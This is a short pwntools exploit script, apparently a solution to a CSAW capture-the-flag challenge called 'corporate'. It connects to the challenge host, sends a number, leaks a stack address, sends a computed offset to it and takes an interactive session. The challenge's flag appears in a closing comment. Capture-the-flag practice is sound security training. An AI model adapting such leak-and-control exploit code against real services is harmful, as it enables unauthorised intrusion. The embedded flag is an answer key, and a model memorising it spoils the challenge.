#!/usr/bin/python3

from pwn import *

#context.log_level = 'debug'

def main():
    #target = process("./corporate") 
    target = remote("rev.chal.csaw.io", 1001)
    
    intro_message = target.recv(1024)
    print(intro_message)

    print("sending 134515941")
    target.send("134515941\n")
    print(target.recvline())
    print(target.recvline())

    stack_addr_leak = int(target.recvline().split()[0].strip(), 16)
    print(stack_addr_leak)

    eax = stack_addr_leak + 52
    print("sending " + str(eax))

    target.send(str(eax) + "\n")
    target.interactive()

if __name__ == "__main__":
    main()

# flag{4ll_p4rt_0f_th3_h31r4rchy}
